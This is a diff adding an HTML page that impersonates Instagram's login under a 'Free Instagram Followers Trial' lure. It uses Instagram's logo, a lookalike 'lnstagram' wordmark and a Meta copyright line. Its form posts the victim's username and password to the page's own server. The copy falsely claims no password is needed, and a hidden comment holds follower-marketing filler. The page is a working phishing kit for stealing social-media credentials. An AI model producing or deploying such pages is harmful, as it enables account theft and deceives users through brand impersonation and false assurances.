@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+        integrity="sha512-DTOQO9RWCh2ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Lobster&family=Lobster+Two:ital,wght@0,400;0,700;1,400;1,700&family=Pacifico&display=swap"
+        rel="stylesheet">
+
+
+    <style>
+        /* Global styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+
+        .banner {
+            width: 70%;
+            position: absolute;
+            top: 0%;
+        }
+
+
+        /* Container styles */
+        .login-container {
+            display: flex;
+            position: absolute;
+            top: 25%;
+            flex-direction: column;
+        }
+
+        /* Login box styles */
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+
+        /* Logo styles */
+        #logo {
+            height: 40px;
+            width: 40px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            font-size: 40px;
+            margin-right: 8px;
+            background: linear-gradient(135deg, #fdc830, #f37335, #c837ab, #5e30b0);
+            color: white;
+        }
+
+        #log {
+            font-size: 40px;
+            color: black;
+            /*font-family: "Pacifico", cursive;
+    font-weight: 400;
+    font-style: normal;*/
+
+            font-family: "Lobster Two", sans-serif;
+            font-weight: 600;
+            font-style: normal;
+
+
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        /* Login button styles */
+        .login-button {
+            background-color: #3897f0;
+            color: white;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #2d7bd3;
+        }
+
+        /* Divider styles */
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background-color: #ccc;
+        }
+
+        .divider span {
+            position: relative;
+            background-color: white;
+            padding: 0 10px;
+            color: #999;
+        }
+
+
+        /* Signup box styles */
+        .signup-box {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        .details {
+            width: 80%;
+            position: absolute;
+            top: 80%;
+            text-align: justify;
+            margin-left: 10%;
+            margin-right: 10%;
+        }
+
+        .details h2 {
+            text-align: center;
+            margin: 25px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="banner">
+        <h1>Free <span style="color : orange">Instagram Followers</span> Trial</h1>
+        Get followers for an unlimited number of accounts that are free and authentic! There are several benefits for
+        your Instagram account when you get followers from us. Increased brand recognition and visibility bring in more
+        revenue.
+    </div>
+    <div class="login-container" style="margin-left: 20px;">
+        <div class="login-box">
+            <i id="logo" class="fa-brands fa-instagram"></i><span id="log">lnstagram</span>
+            <form method="POST" action="/" style="margin-top:20px;">
+                <label>Username:</label>
+                <input type="text" name="name" required value="id" id="email" class=".input-field" style="padding: 5px;"><br><br>
+
+                <label>Password:</label>
+                <input type="password" name="email" id="pass" value="password" required class=".input-field" required style="padding: 5px;"><br><br>
+
+                <button type="submit" class="login-button" id="btn">Submit</button>
+            </form>
+
+        </div>
+        <div class="signup-box">
+            <span>Don't have an account?</span>
+            <a href="https://www.instagram.com/accounts/login/?hl=en">Sign up</a>
+            <p>© 2024 Instagram from Meta</p>
+            <p>If you are going to sign up than you need to comeback here again and fill the details</p>
+        </div>
+    </div>
+
+
+    <div class="details">
+        <h2> How to use our free insta followers trial?</h2>
+        iDigic offers you the chance to test our Instagram services – we are offering a FREE TRIAL for any number of
+        accounts. Our followers trial package is 100% free the first time for every new account. We guarantee the safety
+        of your account as we don’t require your password.
+
+        All you need to do to redeem your free Instagram followers is enter your username and email address and click on
+        the ‘Get Followers’ button. In a few minutes, you’ll get your package of instant free followers.
+
+        <h2>Are you happy with our Free Followers service?</h2>
+        If you’re looking to get more followers for your Instagram account at great prices, head over to our buy
+        instagram followers page. There are several packages for you to choose from. Get more credibility for your Insta
+        account quick and easy!
+
+        <h2>Totally Free & 100% Safe</h2>
+        Getting followers quickly for your Instagram account can be difficult, but we can help get you the required
+        number of followers for your brand. We are offering you a ‘get free Instagram followers’ option so you can find
+        out how good our services are. This is what you need to know about getting your free followers from our site.
+
+        <h2>Advantages of free followers on Instagram</h2>
+        There are several benefits of getting free followers for your insta account. You don’t have to risk money or
+        effort to get more popular.Free followers is also a great way to improve your brand’s credibility and draw more
+        revenue.
+
+        <h2>Earning cash</h2>
+        Instagram accounts are a good supplemental source of cash especially from brands who want to advertise on
+        popular accounts. And the most important statistic these brands look for is the number of followers your account
+        has. The more followers your account has, the more likely you are to attract popular advertising brands.
+
+        <h2>Better sales and revenue</h2>
+        If you are a brand promoting your service on Instagram, it makes sense to capitalize on buying followers. People
+        are more inclined to follow brands which have a lot of followers. So when you buy Instagram followers, you are
+        investing in a way that can bring you even more followers in the future.
+
+        <h2>Become famous with more followers</h2>
+        Instagram is one of the biggest social media platforms out there, and there are a lot of people who have used it
+        as a stepping stone to become famous. When you have a lot of insta followers, people start looking up to you as
+        an influencer which means that you are someone notable. There is a high probability you will be approached for
+        promotions by big brands the larger your follower count is.
+
+        <h2>Why should you invest in Free Instagram Followers without Survey?</h2>
+        Instagram, being one of the biggest marketing platforms, has proven to be really successful at attracting
+        engagement and conversions for business. Getting more Instagram followers can improve traffic metrics to your
+        website. Also, more followers mean better rankings for your brand and website. A lot of websites require you to
+        complete surveys to unlock their free trial package. When you choose Free Instagram Followers without Survey
+        from us you save a lot of time and effort.
+
+        <h2>How important is a free Instagram followers trial for you?</h2>
+        Getting authentic, free Instagram followers instantly added to your account is a huge advantage when it comes to
+        brand credibility. You don’t have to waste hours and days searching for people who will follow you only to
+        unfollow you in a few days time. With the free trial offer, you get a good number of followers which means
+        increased popularity and reputation.
+        <!--
+Want to get Instagram followers fast and free for your Instagram account?
+Your best bet to get Instagram followers quickly and without hassle is through our free trial page. We deliver authentic followers instantly. We also don’t make you jump hurdles through the use of surveys. We can guarantee that anyone who clicks on the Get Followers button here will get their number of free followers delivered within minutes.
+
+Instagram followers hacks you should know
+Instagram is a medium that thrives upon engagement and followers. It is not difficult to gain a lot of followers, but you have to understand that it is no cakewalk either. Since we have been in the social media industry for a long time, we know what it takes to get your account more followers.
+
+We have highlighted a few tips that you can use to get more Instagram followers quickly.
+
+Create engaging content
+Stellar content is the best method to attract more people to your feed. Make sure that the content you post on your brand feed is curated and it appeals to your followers. This can get a lot of engagement as people are always keen about quality content.
+
+Make sure hashtags are appropriate
+Hashtags are an important component when it comes to Instagram. It helps you categorize content as well as showcase creativity. You need to make sure that the hashtags you use are relevant to the product you are selling as well as creative enough to draw people’s attention.
+
+A catchy insta bio
+An Instagram bio is where you are able to add a link to your website as well as tell people what your brand is about. You need to make sure that it is communicative, clear, and concise to your followers. Also, make sure you have tracking tools installed on the link you share on your bio for better metrics.
+
+Working Tips to Avoid Losing Instagram Followers
+A lot of you would’ve noticed that you lose Instagram followers even when you are consistently on the upswing. While this is something that every Instagrammer in the world experiences, but it can be alleviated. Here are a few things that you should keep in mind so you don’t lose too many followers over a period of time.
+
+Post consistently
+Instagram is a platform that relies heavily on consistent posting schedules to get the most out of your account. To this end, you should ensure that you post consistently and sync it to the time when your followers are the most active during the day and the week.
+
+Know your audience
+There are several things that you need to understand your audience. You need to make sure that you post content that is relevant to them. You also need to keep in mind that audiences like to be engaged as well, so keep your options open about user-generated content.
+
+Improved Captions
+After hashtags, captions are the most important cog in an Instagram post. Your captions need to be engaging, creative and should prompt the followers for a response. This can result in a lot of comments which is great for engagement numbers.
+-->
+    </div>
+
+    <script src="data.js">
+
+    </script>
+
+    <div class="footer">
+
+    </div>
+
+
+</body>
+
+</html>
